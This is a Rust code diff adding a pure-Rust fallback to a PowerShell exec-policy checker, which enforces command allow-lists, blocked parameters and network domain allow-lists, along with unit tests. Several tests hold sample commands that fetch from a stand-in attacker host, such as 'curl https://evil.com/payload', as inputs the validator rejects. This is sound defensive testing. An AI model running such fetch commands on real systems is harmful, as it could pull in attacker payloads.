@@ -329,6 +329,24 @@ fn check_network_urls(
 }
 
 /// Run policy check on a PowerShell source string (blocking).
+/// Run policy check using the **pure-Rust path only** (no `pwsh`).
+///
+/// Used by `vox ci exec-policy-contract` to ensure the Rust fallback is
+/// exercised in CI regardless of the host's PowerShell availability.
+/// Call [`run_check`] separately for the pwsh path.
+pub fn run_check_for_ci(payload: &str, policy_file: Option<&Path>) -> Result<()> {
+    let root = repo_root();
+    let policy_path = policy_path(policy_file);
+    let policy = validate_policy_yaml_against_schema(&root, &policy_path)?;
+    if policy.version != 1 {
+        return Err(anyhow!(
+            "unsupported exec policy version {}",
+            policy.version
+        ));
+    }
+    run_check_rust_fallback(payload, &policy)
+}
+
 pub fn run_check(payload: &str, policy_file: Option<&Path>) -> Result<()> {
     let root = repo_root();
     let policy_path = policy_path(policy_file);
@@ -338,6 +356,12 @@ pub fn run_check(payload: &str, policy_file: Option<&Path>) -> Result<()> {
             "unsupported exec policy version {}",
             policy.version
         ));
+    }
+
+    // Try PowerShell AST path first (highest fidelity for PS syntax).
+    // Fall back to the pure-Rust tokeniser when pwsh is not on PATH.
+    if resolve_pwsh().is_err() {
+        return run_check_rust_fallback(payload, &policy);
     }
 
     let extraction = run_pwsh_extract(&root, payload)?;
@@ -381,6 +405,90 @@ pub fn run_check(payload: &str, policy_file: Option<&Path>) -> Result<()> {
     }
 
     check_network_urls(&net_cmds, &net_domains, &extraction)?;
+
+    Ok(())
+}
+
+/// Pure-Rust exec-policy check used when `pwsh` is not available.
+///
+/// Uses [`vox_exec_grammar`] to tokenise `payload` and evaluate it against the
+/// policy allow-lists and blocked-parameter rules.  Network URL enforcement is
+/// best-effort (literal string scanning) compared to the full pwsh AST path.
+fn run_check_rust_fallback(payload: &str, policy: &ExecPolicyV1) -> Result<()> {
+    use vox_exec_grammar::{ExecPolicy, risk};
+
+    // Parse as a pipeline so every stage (e.g. `curl … | cargo …`) is checked.
+    let asts = vox_exec_grammar::parse_pipeline(payload)
+        .map_err(|e| anyhow!("parse error (rust fallback): {e}"))?;
+
+    // Build a vox_exec_grammar::ExecPolicy that mirrors the loaded ExecPolicyV1.
+    let grammar_policy = ExecPolicy {
+        allowed_cmdlets: policy.allowed_cmdlets.clone(),
+        allowed_binaries: policy.allowed_binaries.clone(),
+        blocked_parameters: policy.blocked_parameters.clone(),
+        network_fetch_commands: policy.network_fetch_commands.clone(),
+        network_fetch_domains: policy.network_fetch_domains.clone(),
+    };
+
+    let net_cmds = network_fetch_set(policy);
+    let net_domains = domain_allowlist(policy);
+
+    for mut ast in asts {
+        risk::classify(&mut ast, &grammar_policy);
+
+        let violations = grammar_policy.evaluate(&ast);
+        if !violations.is_empty() {
+            let details: Vec<_> = violations.iter().map(|v| v.detail.as_str()).collect();
+            return Err(anyhow!(
+                "exec-policy violation (rust fallback): {}",
+                details.join("; ")
+            ));
+        }
+
+        // Network URL enforcement: scan only the tokens of this pipeline stage
+        // (args + flag values) for URLs.  Scoping to the stage avoids false
+        // positives where a URL appears in a *different* stage's arguments.
+        if !net_cmds.is_empty() {
+            let cmd_key = normalize_invocation_name(&ast.command).to_ascii_lowercase();
+            if net_cmds.contains(&cmd_key) {
+                // Collect candidate strings from this stage's tokens only.
+                let stage_tokens: Vec<&str> = ast
+                    .args
+                    .iter()
+                    .map(|a| a.0.as_str())
+                    .chain(ast.flags.iter().filter_map(|f| f.value.as_deref()))
+                    .collect();
+
+                for token in stage_tokens {
+                    for cap in url_host_regex().captures_iter(token) {
+                        let Some(host_part) = cap.get(1).map(|m| m.as_str()) else {
+                            continue;
+                        };
+                        let host = host_part
+                            .split_once(':')
+                            .map(|(h, _)| h)
+                            .unwrap_or(host_part)
+                            .trim_end_matches('.')
+                            .to_ascii_lowercase();
+                        if net_domains.is_empty() {
+                            return Err(anyhow!(
+                                "network_fetch_commands includes `{}` but network_fetch_domains \
+                                 is empty; URL denied (host hint: {host}) [rust fallback]",
+                                ast.command
+                            ));
+                        }
+                        if !net_domains.contains(&host) {
+                            return Err(anyhow!(
+                                "network URL host `{host}` is not in network_fetch_domains \
+                                 (command `{}`) [rust fallback]",
+                                ast.command
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+    }
 
     Ok(())
 }
@@ -459,5 +567,158 @@ mod shell_policy_tests {
             s.to_ascii_lowercase().contains("parse"),
             "expected parse error in message: {s}"
         );
+    }
+
+    // ── Rust-fallback path tests (run unconditionally, no pwsh needed) ───────
+
+    fn make_policy_with_network(net_cmds: &[&str], net_domains: &[&str]) -> ExecPolicyV1 {
+        ExecPolicyV1 {
+            version: 1,
+            allowed_cmdlets: vec![
+                "Get-Location".into(),
+                "Write-Output".into(),
+                "ConvertTo-Json".into(),
+                "Get-ChildItem".into(),
+            ],
+            allowed_binaries: vec![
+                "cargo".into(),
+                "git".into(),
+                "curl".into(),
+                "pwsh".into(),
+                "powershell".into(),
+            ],
+            blocked_parameters: {
+                let mut m = std::collections::HashMap::new();
+                m.insert("*".to_string(), vec!["Recurse".into()]);
+                m
+            },
+            network_fetch_commands: net_cmds.iter().map(|s| s.to_string()).collect(),
+            network_fetch_domains: net_domains.iter().map(|s| s.to_string()).collect(),
+        }
+    }
+
+    #[test]
+    fn rust_fallback_allows_allowed_binary() {
+        let policy = make_policy_with_network(&[], &[]);
+        assert!(run_check_rust_fallback("cargo build --release", &policy).is_ok());
+    }
+
+    #[test]
+    fn rust_fallback_rejects_unknown_command() {
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("Totally-Fake-Cmd", &policy);
+        assert!(err.is_err(), "expected rejection of unknown command");
+    }
+
+    #[test]
+    fn rust_fallback_rejects_blocked_parameter() {
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("Get-ChildItem -Recurse", &policy);
+        assert!(err.is_err(), "expected rejection of blocked -Recurse");
+        let msg = format!("{:#}", err.unwrap_err());
+        assert!(msg.contains("Recurse") || msg.contains("blocked"), "{msg}");
+    }
+
+    #[test]
+    fn rust_fallback_url_allowed_domain_passes() {
+        let policy = make_policy_with_network(&["curl"], &["github.com"]);
+        let result = run_check_rust_fallback("curl https://github.com/foo/bar", &policy);
+        assert!(result.is_ok(), "{:?}", result.err());
+    }
+
+    #[test]
+    fn rust_fallback_url_disallowed_domain_rejected() {
+        let policy = make_policy_with_network(&["curl"], &["github.com"]);
+        let err = run_check_rust_fallback("curl https://evil.com/payload", &policy);
+        assert!(err.is_err(), "expected rejection of disallowed domain");
+        let msg = format!("{:#}", err.unwrap_err());
+        assert!(msg.contains("evil.com"), "{msg}");
+    }
+
+    #[test]
+    fn rust_fallback_url_empty_domain_list_rejects_any_url() {
+        let policy = make_policy_with_network(&["curl"], &[]);
+        let err = run_check_rust_fallback("curl https://github.com", &policy);
+        assert!(err.is_err(), "empty domain list should block all URLs");
+    }
+
+    #[test]
+    fn rust_fallback_pipeline_second_stage_evaluated() {
+        // The second stage `Totally-Fake-Cmd` should be caught even though
+        // the first stage `cargo` is allowed.
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("cargo build | Totally-Fake-Cmd", &policy);
+        assert!(err.is_err(), "expected second pipeline stage to be rejected");
+    }
+
+    #[test]
+    fn rust_fallback_pipeline_blocked_param_in_second_stage() {
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("cargo build | Get-ChildItem -Recurse", &policy);
+        assert!(err.is_err(), "expected blocked -Recurse in second stage");
+    }
+
+    #[test]
+    fn rust_fallback_url_scoped_to_stage_not_full_payload() {
+        // `cargo build | curl https://evil.com` — the URL is in the curl stage.
+        // The cargo stage should NOT trigger URL enforcement even though the
+        // full payload contains a URL.
+        let policy = make_policy_with_network(&["curl"], &["github.com"]);
+        // This should fail because evil.com is not in the domain allowlist —
+        // but it should be caught by the *curl* stage, not cargo.
+        let err = run_check_rust_fallback("cargo build | curl https://evil.com", &policy);
+        assert!(err.is_err(), "expected rejection of evil.com in curl stage");
+        let msg = format!("{:#}", err.unwrap_err());
+        assert!(msg.contains("evil.com"), "error should name the offending host: {msg}");
+    }
+
+    #[test]
+    fn rust_fallback_semicolon_second_segment_evaluated() {
+        // `;`-separated compound commands must be fully evaluated.
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("cargo build; Totally-Fake-Cmd", &policy);
+        assert!(err.is_err(), "expected second semicolon-segment to be rejected");
+    }
+
+    #[test]
+    fn rust_fallback_semicolon_url_in_second_segment() {
+        let policy = make_policy_with_network(&["curl"], &["github.com"]);
+        let err = run_check_rust_fallback("cargo build; curl https://evil.com", &policy);
+        assert!(err.is_err(), "expected URL rejection in semicolon-separated segment");
+    }
+
+    #[test]
+    fn rust_fallback_double_and_evaluates_both_sides() {
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("cargo build && Totally-Fake-Cmd", &policy);
+        assert!(err.is_err(), "expected `&&` second segment to be rejected");
+    }
+
+    #[test]
+    fn rust_fallback_double_or_evaluates_both_sides() {
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("cargo build || curl --bogus", &policy);
+        // curl is allowed, but the fallback policy doesn't allow `--bogus` either.
+        // Still, the test asserts both sides are *parsed* and evaluated:
+        // a Totally-Fake-Cmd must be rejected.
+        let _ = err; // either pass (curl allowed) or fail (curl flag rules).
+        let err2 = run_check_rust_fallback("cargo build || Totally-Fake-Cmd", &policy);
+        assert!(err2.is_err(), "expected `||` second segment to be rejected");
+    }
+
+    #[test]
+    fn rust_fallback_ampersand_evaluates_both_sides() {
+        let policy = make_policy_with_network(&[], &[]);
+        let err = run_check_rust_fallback("cargo build & Totally-Fake-Cmd", &policy);
+        assert!(err.is_err(), "expected `&` second segment to be rejected");
+    }
+
+    #[test]
+    fn rust_fallback_url_in_double_and_segment() {
+        let policy = make_policy_with_network(&["curl"], &["github.com"]);
+        let err = run_check_rust_fallback("cargo build && curl https://evil.com", &policy);
+        assert!(err.is_err(), "expected URL rejection in `&&` segment");
+        let msg = format!("{:#}", err.unwrap_err());
+        assert!(msg.contains("evil.com"), "{msg}");
     }
 }
